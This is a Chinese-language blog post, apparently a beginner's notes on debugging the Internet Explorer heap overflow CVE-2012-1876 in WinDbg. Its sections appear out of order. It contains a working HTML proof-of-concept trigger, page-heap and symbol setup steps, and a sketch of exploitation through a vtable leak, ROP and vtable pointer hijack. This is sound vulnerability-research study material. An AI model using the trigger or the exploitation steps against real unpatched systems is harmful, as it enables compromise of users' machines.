
很简单的能观察到`03f2ae30`的`AAAA`字符串被大量覆盖，所以它就是`vulheap`。

为做对比，我多打印了很多，下面的未被覆盖的`AAAA`都是成片出现的。

**不过对比漏洞战争书上，本来`03f2b040`地址处的`fa`被覆盖为`48 00 01 00`即`0x00010048`,这个覆盖看的出来（下图蓝色框线）。**

按照`0x03f2ae30+0x100(EEEE...)+0x8(堆指针大小)+0x100(AAAA...)+0x8(堆指针大小)=03f2b040`,也确实应该是这里，我应该没理解错。**

**但是很奇怪，我的`fa`也还在……（下图红色框线），这可能就是我之前弹窗打印出的虚表地址不正确的原因吧，感觉别人的文章里都不会这样……难以理解**

![](upload/attach/202208/721335_WE6ZTJB75XH8PWD.jpg)

得到虚表地址后，计算`mshtml`基地址，构造`rop`。

然后再次溢出，这次溢出直接像刚刚覆盖`BBBB`的大小一样，直接覆盖虚表指针，于是就可以劫持虚表指针到任意地址，如下。

```
(6cc.7f8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=07070024--->控制虚表指针 ebx=01000000 ecx=040f8910 edx=00000041 esi=0375f530 edi=040e0790
eip=003d006b esp=0375f368 ebp=0375f3a0 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202
003d006b 777a ja 003d00e7 [br=1]
```

## 总结

调试`poc`的时候还是比较顺利的，在调`exp`那里各种卡壳，唉。

主要还是学到了一些`windbg`的使用吧。

比如如果要下断点，其实可以在`html`里插入数学函数，比如用`Math.cos`，然后在`jscript!Cos`下断。

比如要查看`jscript`的导出表，可以在`windbg`里用`x jscript\*`来查找，找虚表可以使用类似的方法（见上文）

## 前言

在调试漏洞战争上的`CVE-2012-1876`做了一些笔记，漏洞分析的话漏洞战争和`vupen`的文章已经写的很清楚了。

因为是第一次用`windbg`,所以我主要把自己的环境搭建（比如怎么导入符号文件）和调试日志（十分详细）记录了一下，希望对那些和我一样，刚开始学习漏洞分析与调试的人有所帮助。

## 参考资料

- [windbg在线手册](https://bbs.kanxue.com/elink@bf9K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3c8T1k6%4c8W2j5$3S2Q4x3X3g2F1k6i4c8Q4x3V1k6%4K9h3&6V1j5X3N6Z5k6h3I4H3i4K6u0r3K9h3&6V1k6i4S2Q4x3X3g2Z5N6r3#2D9)

- 漏洞战争

- [vupen Advanced Exploitation of Internet Explorer Heap Overflow](https://bbs.kanxue.com/elink@024K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6W2N6r3g2J5L8X3q4D9M7$3q4C8N6i4u0S2i4K6u0r3j5%4c8X3i4K6g2X3M7s2N6F1i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8X3y4$3k6g2)9#2k6U0t1H3x3e0u0Q4y4h3j5I4z5o6M7$3i4K6u0r3b7h3c8$3j5h3&6U0k6h3c8Q4x3U0f1J5x3p5g2^5M7r3I4G2K9i4c8S2N6r3W2G2L8W2)9J5y4e0t1H3L8$3k6Q4x3U0f1J5x3p5W2F1N6r3g2J5L8X3g2@1i4K6t1#2x3U0m8q4P5s2m8D9L8%4u0W2M7W2)9J5y4e0t1H3d9r3g2S2M7q4)9J5y4e0t1H3e0%4k6W2M7X3k6D9L8%4N6Q4x3X3g2H3k6r3j5`.)

## 调试环境搭建

### 下载

- `win7 32位`:[下载链接](https://bbs.kanxue.com/elink@891k6h3b7J5K9#2)9K6b7g2)9J5c8W2)9J5c8W2)9%4b7$3k6A6L8r3g2Q4y4@1y4U0L8W2)9#2k6Y4N6A6L8X3c8G2N6%4y4Q4y4h3j5%4i4K6g2X3M7s2u0G2k6X3g2K6M7$3W2G2L8X3q4D9i4K6g2X3P5o6R3$3i4K6g2X3k6s2k6V1i4K6g2X3P5o6p5#2i4K6u0V1y4U0f1%4z5e0m8Q4x3X3g2A6M7$3!0Q4y4@1x3J5y4U0l9@1x3U0x3^5z5o6b7^5i4K6N6o6k6e0R3I4x3X3k6T1k6e0M7#2z5r3j5H3y4h3t1@1z5o6g2U0y4h3p5^5y4e0S2U0x3U0t1H3y4U0l9%4z5o6g2Q4y4@1y4Z5i4K6y4p5f1K6g2d9e0V1u0x3y4f1A6x3y4f1&6d9b7K6y4k6e0f1I4p5g2@1W2a6y4K6g2k6h3e0y4g2f1o6c8q4g2o6g2Q4y4@1y4Q4x3V1j5`.)

- `windbg6.1`:[下载链接](https://bbs.kanxue.com/elink@e90K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4x3$3&6*7g2r3&6K6L8h3#2i4c8p5A6G2d9W2u0e0b7Y4y4T1i4K6g2X3h3W2m8%4)

### windbg符号文件设置

在`windbg`的窗口里输入

![](https://bbs.kanxue.com/upload/attach/202208/721335_2NMKZGDR9GVCYR7.jpg)

```
.sympath SRV*c:\localsymbols*25cK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3#2K6k6r3I4Q4x3X3g2E0K9h3y4J5L8%4y4G2k6Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6V1L8%4N6F1L8r3!0S2k6q4)9J5c8Y4y4&6L8h3u0G2L8s2x3`.
```

重启后要重新输入。

## poc调试

```
<html>

 <body>

 <table style="table-layout:fixed" >

        <col id="132" width="41" span="1" >&nbsp </col>

 </table>

 <script>



 function over_trigger() {

        var obj_col = document.getElementById("132");

        obj_col.width = "42765";

        obj_col.span = 1000;

 }



 setTimeout("over_trigger();",1);



 </script>

 </body>

 </html>
```

基于`HPA`的漏洞分析方法

- `hpa`：启动页堆，在堆块后增加专门用于检测溢出的栅栏页，若发生堆溢出触及栅栏页便会立刻触发异常。

在终端通过`gflags`启动`hpa`

![](https://bbs.kanxue.com/upload/attach/202208/721335_XJEGKMSY6KNECK4.jpg)

启动`ie`浏览器后，用`windbg` `attach`进程

![](https://bbs.kanxue.com/upload/attach/202208/721335_WY7TX7YGZ5QDWQZ.jpg)

![](https://bbs.kanxue.com/upload/attach/202208/721335_CWJ72ZYPTYTBBZY.jpg)

两个进程，一个是`broker`进程 一个是页面的内容进程，附加后面的那个就可以，就是内容进程。

检查一下`hpa`开了没。

```
0:000> .symfix

0:000> .reload

Reloading current modules

................................................................

.............................

0:000> !gflag

Current NtGlobalFlag contents: 0x02000000

    hpa - Place heap allocations at ends of pages
```

然后需要开启子进程调试，这样才能断下来。

```
.childdbg 1
```

然后`g`，启动调试器。

```
0:027> g

ModLoad: 74c30000 74c38000   C:\Windows\system32\credssp.dll

ModLoad: 752a0000 752a8000   C:\Windows\system32\secur32.dll

ModLoad: 750c0000 750f8000   C:\Windows\system32\ncrypt.dll

ModLoad: 750a0000 750b7000   C:\Windows\system32\bcrypt.dll

ModLoad: 74c70000 74cad000   C:\Windows\system32\bcryptprimitives.dll

ModLoad: 74b50000 74b66000   C:\Windows\system32\GPAPI.dll

ModLoad: 70c60000 70c7c000   C:\Windows\system32\cryptnet.dll

ModLoad: 72e70000 72e85000   C:\Windows\system32\Cabinet.dll

ModLoad: 74d10000 74d1e000   C:\Windows\system32\DEVRTL.dll
```

![](https://bbs.kanxue.com/upload/attach/202208/721335_N3NX6CVAJ5YT782.jpg)

看到`debugger`正在运行了。

然后把`poc`拖到浏览器里运行。

另外`poc`拖进去之后，会自动断下来。

![](https://bbs.kanxue.com/upload/attach/202208/721335_RN9YTN595WZXZJQ.jpg)

再`g`一下，就变成下面这个样子。
